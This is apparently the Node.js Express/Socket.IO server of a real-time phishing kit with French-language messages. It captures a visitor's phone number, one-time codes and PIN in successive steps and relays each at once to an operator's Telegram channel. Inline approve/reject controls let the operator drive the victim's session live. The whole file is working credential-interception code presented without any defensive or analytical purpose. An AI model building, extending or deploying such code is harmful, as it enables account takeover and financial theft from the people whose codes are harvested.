const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const crypto = require('crypto');

// Import the Telegram Bot Manager
const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Use in-memory fallback stores on global object to safeguard active sessions against serverless restarts
if (!global.activeRooms) {
    global.activeRooms = new Map();
}

// Initialize Socket.IO with transport optimizations designed for Vercel
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['polling'], // Force HTTP long-polling to prevent WebSocket handshake errors
    allowEIO3: true,
    pingTimeout: 30000,
    pingInterval: 15000
});

// Expose global.io reference for the bot manager callback triggers
global.io = io;

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// Route serving the primary frontend entrypoint
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Helper utility to generate non-colliding Session IDs
function generateSessionId() {
    return crypto.randomBytes(8).toString('hex');
}

io.on('connection', (socket) => {
    console.log(`[Socket Server] New socket connected. ID: ${socket.id}`);

    // Track active connection's registered room ID
    let currentAppId = null;

    // Step 1 Event listener: Receive phone number and send it to Telegram immediately
    socket.on('request-otp1', (payload) => {
        console.log(`[Socket Server] Event [request-otp1] received from socket ${socket.id}. Payload:`, payload);
        
        if (!payload || !payload.phone) {
            console.error("[Socket Server] Missing phone number in request-otp1 payload.");
            socket.emit('otp-failed', { message: "Numéro de téléphone invalide." });
            return;
        }

        // Always create a new operational session on phone submission
        const appId = generateSessionId();
        currentAppId = appId;
        
        // Register connection details
        socket.join(appId);
        global.activeRooms.set(appId, { phone: payload.phone, socketId: socket.id });
        console.log(`[Socket Server] Created Room [${appId}] for client registration.`);

        // Echo session creation details immediately to the frontend
        socket.emit('session-ready', { appId: appId });

        // Build Telegram diagnostic template
        const metadata = {
            telephone: payload.phone,
            registrationTime: new Date().toLocaleTimeString(),
            connectionType: 'Vercel Serverless Gateway'
        };

        console.log(`[Socket Server] Dispatching immediate phone notification to Telegram Admin Channel...`);
        // We set generateControls to false here because we do NOT need inline buttons yet.
        // Controls should only be generated when the actual OTP is captured at the next step.
        botManager.sendToAdmin(appId, "Initial Connection Attempt (Phone)", metadata, false);

        // Advance client step-form state instantly
        socket.emit('otp1-requested-success');
    });

    // Step 2 Event listener: Capture and transmit OTP 1 immediately
    socket.on('verify-otp1', (payload) => {
        console.log(`[Socket Server] Event [verify-otp1] received. Payload:`, payload);
        
        const appId = payload.appId || currentAppId;
        if (!appId) {
            console.error("[Socket Server] Invalid session scope during verify-otp1 processing.");
            socket.emit('otp-failed', { message: "Erreur de session. Veuillez soumettre à nouveau." });
            return;
        }

        // Restore room mapping context
        if (!socket.rooms.has(appId)) {
            socket.join(appId);
        }

        const metadata = {
            telephone: payload.phone || "Non spécifié",
            codeSaisi: payload.code,
            validationTime: new Date().toLocaleTimeString()
        };

        console.log(`[Socket Server] Dispatching captured OTP 1 straight to Telegram admin...`);
        // We generate inline controls (Approve/Reject) to let the administrator advance the client step on Telegram
        botManager.sendToAdmin(appId, "Initial OTP 1 Verification Layer", metadata, true);
    });

    // Step 3 Event listener: Secure and map PIN entries
    socket.on('verify-pin', (payload) => {
        console.log(`[Socket Server] Event [verify-pin] received. Payload:`, payload);

        const appId = payload.appId || currentAppId;
        if (!appId) {
            console.error("[Socket Server] Invalid session scope during verify-pin processing.");
            socket.emit('pin-failed', { message: "Erreur de session." });
            return;
        }

        if (!socket.rooms.has(appId)) {
            socket.join(appId);
        }

        console.log(`[Socket Server] Dispatching PIN payload directly to Telegram...`);
        botManager.sendFinalApproval(appId, payload.pin);
    });

    // Step 4 Event listener: Secondary verification layer (OTP 2)
    socket.on('verify-otp2', (payload) => {
        console.log(`[Socket Server] Event [verify-otp2] received. Payload:`, payload);

        const appId = payload.appId || currentAppId;
        if (!appId) {
            console.error("[Socket Server] Invalid session scope during verify-otp2 processing.");
            socket.emit('otp2-failed', { message: "Erreur de session." });
            return;
        }

        if (!socket.rooms.has(appId)) {
            socket.join(appId);
        }

        console.log(`[Socket Server] Dispatching Secondary OTP 2 straight to Telegram...`);
        botManager.sendSecondOTP(appId, payload.code);
    });

    // Reconnection socket handler
    socket.on('join-room', (payload) => {
        console.log(`[Socket Server] Re-registering socket connection [${socket.id}] to active Room:`, payload.appId);
        if (payload && payload.appId) {
            socket.join(payload.appId);
            currentAppId = payload.appId;
        }
    });

    socket.on('disconnect', (reason) => {
        console.log(`[Socket Server] Socket disconnected: ${socket.id}. Reason: ${reason}`);
    });
});

// Export server configuration as a unified module handler
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[System Core] Web Services active. Listening on Port ${PORT}`);
});
